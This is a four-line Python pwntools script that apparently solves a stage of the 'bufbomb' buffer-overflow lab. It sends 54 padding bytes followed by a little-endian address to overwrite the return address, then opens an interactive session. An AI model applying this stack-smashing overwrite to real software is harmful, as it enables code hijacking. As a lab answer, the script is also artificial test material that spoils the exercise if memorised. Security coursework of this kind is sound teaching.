from pwn import *
io = process(["./bufbomb", "-u", "059167235"])
io.sendline(b'A'*54 + bytes.fromhex("80ee8bbb")[::-1])
io.interactive()